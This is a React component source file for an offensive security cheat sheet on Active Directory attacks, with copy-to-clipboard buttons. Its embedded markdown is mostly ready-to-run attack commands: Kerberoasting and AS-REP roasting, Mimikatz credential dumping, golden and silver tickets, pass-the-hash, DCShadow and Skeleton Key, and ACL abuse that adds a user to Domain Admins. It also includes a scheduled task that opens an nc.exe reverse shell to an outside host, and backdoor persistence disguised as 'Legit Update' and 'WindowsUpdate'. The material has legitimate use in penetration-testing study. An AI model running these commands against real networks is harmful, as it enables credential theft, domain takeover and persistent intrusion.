import { useState } from 'react';
import { motion } from 'framer-motion';
import { FaChevronDown, FaSitemap, FaInfoCircle } from 'react-icons/fa';
import ReactMarkdown from 'react-markdown';
import { copyToClipboard } from '../../utils/copyToClipboard';
import { toast } from 'react-toastify';

const ActiveDirectoryAttacks = () => {
  const [expandedSection, setExpandedSection] = useState('enumeration');

  const toggleSection = (section) => {
    setExpandedSection(expandedSection === section ? null : section);
  };

  const handleCopy = (command) => {
    copyToClipboard(command);
    toast.success('Command copied to clipboard!');
  };

  const sections = [
    {
      id: 'enumeration',
      title: 'AD Enumeration',
      content: [
        {
          type: 'markdown',
          value: `### Basic Enumeration Commands
\`\`\`powershell
# Get current domain
Get-ADDomain

# List all domain computers
Get-ADComputer -Filter * | Select-Object Name

# List all domain users
Get-ADUser -Filter * | Select-Object SamAccountName

# Find domain controllers
Get-ADDomainController -Filter * | Select-Object Name, IPv4Address
\`\`\``
        },
        {
          type: 'markdown',
          value: `### BloodHound & SharpHound
\`\`\`powershell
# Collect data with SharpHound
Invoke-BloodHound -CollectionMethod All -Domain CONTOSO.COM -ZipFileName loot.zip

# Common collection methods:
- Default: Basic AD info
- Session: Logged-on users
- LoggedOn: Machines users are logged into
- ACL: Permission relationships
- Group: Group membership
- Trusts: Domain trust info
\`\`\``
        },
        {
          type: 'markdown',
          value: `### LDAP Queries
\`\`\`bash
# Basic LDAP search
ldapsearch -x -h dc01.contoso.com -D "CN=user,CN=Users,DC=contoso,DC=com" -w password -b "DC=contoso,DC=com"

# Find high privilege users
ldapsearch -x -b "DC=contoso,DC=com" "(adminCount=1)" | grep memberOf

# Find users with SPNs (potential Kerberoast targets)
ldapsearch -x -b "DC=contoso,DC=com" "(&(objectClass=user)(servicePrincipalName=*))" servicePrincipalName
\`\`\``
        }
      ]
    },
    {
      id: 'kerberos',
      title: 'Kerberos Attacks',
      content: [
        {
          type: 'markdown',
          value: `### Kerberoasting
\`\`\`powershell
# Request all service tickets
Add-Type -AssemblyName System.IdentityModel
setspn.exe -T CONTOSO.COM -Q */* | Select-String '^CN' -Context 0,1 | % { 
  $_.Line.Split(' ')[0] 
} | % { 
  $user = $_; 
  Add-Type -AssemblyName System.IdentityModel; 
  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "$user" 
}

# Extract tickets with Mimikatz
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Crack with hashcat
hashcat -m 13100 hashes.txt rockyou.txt
\`\`\``
        },
        {
          type: 'markdown',
          value: `### AS-REP Roasting
\`\`\`powershell
# Find users with "Do not require Kerberos pre-authentication"
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth

# Request AS-REP hashes
Get-ASREPHash -UserName vulnerableuser -Domain CONTOSO.COM

# Crack with hashcat
hashcat -m 18200 asrep-hash.txt rockyou.txt
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Golden/Silver Tickets
\`\`\`powershell
# Dump krbtgt hash with Mimikatz
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

# Create golden ticket
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:contoso.com /sid:S-1-5-21-123456789-1234567890-123456789 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /ptt"'

# Silver ticket for specific service
Invoke-Mimikatz -Command '"kerberos::golden /user:ServiceAcct /domain:contoso.com /sid:S-1-5-21-123456789 /target:sqlserver.contoso.com /service:MSSQLSvc /rc4:1fadb1b13ed0375b5cfb4cc9f72644f0 /ptt"'
\`\`\``
        }
      ]
    },
    {
      id: 'acl',
      title: 'ACL Abuse',
      content: [
        {
          type: 'markdown',
          value: `### Common ACL Misconfigurations
\`\`\`powershell
# Find users with GenericAll permissions
Find-InterestingDomainAcl | Where-Object { $_.ActiveDirectoryRights -match "GenericAll" }

# Check for GenericWrite on users
Get-ObjectAcl -SamAccountName targetuser -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "GenericWrite" }

# Find users who can add members to privileged groups
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21" }
\`\`\``
        },
        {
          type: 'markdown',
          value: `### ACL Attack Examples
\`\`\`powershell
# Add user to privileged group (if you have WriteProperty)
Add-ADGroupMember -Identity "Domain Admins" -Members compromiseduser

# Abuse ForceChangePassword right
Set-ADAccountPassword -Identity targetuser -NewPassword (ConvertTo-SecureString -AsPlainText "NewPassword123!" -Force) -Reset

# Abuse GenericWrite to set SPN for targeted Kerberoasting
Set-ADUser -Identity targetuser -ServicePrincipalNames @{Add="HOST/targetcomputer.contoso.com"}
\`\`\``
        }
      ]
    },
    {
      id: 'lateral',
      title: 'Lateral Movement',
      content: [
        {
          type: 'markdown',
          value: `### Common Techniques
\`\`\`powershell
# WMI Execution
Invoke-WmiMethod -Path "Win32_Process" -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName targetpc

# PowerShell Remoting
Enter-PSSession -ComputerName targetpc -Credential (Get-Credential)

# Scheduled Tasks
schtasks /create /s targetpc /tn "Backup" /tr "cmd.exe /c C:\tools\nc.exe 10.10.10.10 4444 -e cmd.exe" /sc once /st 00:00 /ru SYSTEM
schtasks /run /s targetpc /tn "Backup"

# Pass-the-Hash with Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:contoso.com /ntlm:a9b30e5b0dc865eadcea9411e4ade72d /run:cmd.exe"'
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Unconstrained Delegation
\`\`\`powershell
# Find computers with unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation

# After compromising such a system, wait for admin to connect:
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Find interesting tickets (e.g., for domain controllers)
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$
\`\`\``
        }
      ]
    },
    {
      id: 'persistence',
      title: 'Persistence Techniques',
      content: [
        {
          type: 'markdown',
          value: `### Domain Persistence Methods
\`\`\`powershell
# Golden Ticket (as shown earlier)
# Silver Ticket (as shown earlier)

# DCShadow attack (requires DA privileges)
Invoke-Mimikatz -Command '"lsadump::dcshadow /object:CN=User,CN=Users,DC=contoso,DC=com /attribute:Description /value:Hacked"'

# Skeleton Key (requires DA privileges)
Invoke-Mimikatz -Command '"misc::skeleton"'

# Malicious GPO
New-GPO -Name "Legit Update" | New-GPLink -Target "DC=contoso,DC=com"
Set-GPPrefRegistryValue -Name "Legit Update" -Context Computer -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Update" -Value "cmd.exe /c C:\temp\backdoor.exe" -Type ExpandString
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Local Persistence
\`\`\`powershell
# Registry Run Key
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\backdoor.exe" /f

# Scheduled Task
schtasks /create /tn "Cleanup" /tr "C:\temp\backdoor.exe" /sc daily /st 09:00 /ru SYSTEM

# Service Creation
sc.exe create "WindowsUpdate" binPath= "C:\temp\backdoor.exe" start= auto
sc.exe start "WindowsUpdate"
\`\`\``
        }
      ]
    }
  ];

  return (
    <div className="cheatsheet-container">
      <h2 className="cheatsheet-title">
        <FaSitemap /> Active Directory Enumeration & Attacks
      </h2>
      
      <div className="info-banner">
        <FaInfoCircle />
        <p>
          Comprehensive guide to Active Directory enumeration, exploitation, and lateral movement techniques.
          Covers Kerberos attacks, ACL abuse, persistence methods, and BloodHound usage.
        </p>
      </div>
      
      <div className="sections-container">
        {sections.map((section) => (
          <div key={section.id} className="section">
            <motion.div
              className="section-header"
              onClick={() => toggleSection(section.id)}
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
            >
              <h3>{section.title}</h3>
              <motion.div
                animate={{ rotate: expandedSection === section.id ? 180 : 0 }}
              >
                <FaChevronDown />
              </motion.div>
            </motion.div>
            
            <motion.div
              className="section-content"
              initial={{ opacity: 0, height: 0 }}
              animate={{
                opacity: expandedSection === section.id ? 1 : 0,
                height: expandedSection === section.id ? 'auto' : 0
              }}
              transition={{ duration: 0.3 }}
            >
              {expandedSection === section.id && (
                <div className="content-inner">
                  {section.content.map((item, index) => (
                    <div key={index} className="content-item">
                      {item.type === 'command' ? (
                        <div className="command-item">
                          <div className="command-header">
                            <code>{item.value}</code>
                            <button
                              onClick={() => handleCopy(item.value)}
                              className="copy-button small"
                            >
                              Copy
                            </button>
                          </div>
                          <p className="command-description">{item.description}</p>
                        </div>
                      ) : (
                        <div className="markdown-content">
                          <ReactMarkdown>
                            {item.value}
                          </ReactMarkdown>
                          <button
                            onClick={() => handleCopy(item.value.replace(/```[a-z]*\n/, '').replace(/\n```/, ''))}
                            className="copy-button"
                          >
                            Copy All
                          </button>
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              )}
            </motion.div>
          </div>
        ))}
      </div>
    </div>
  );
};

export default ActiveDirectoryAttacks;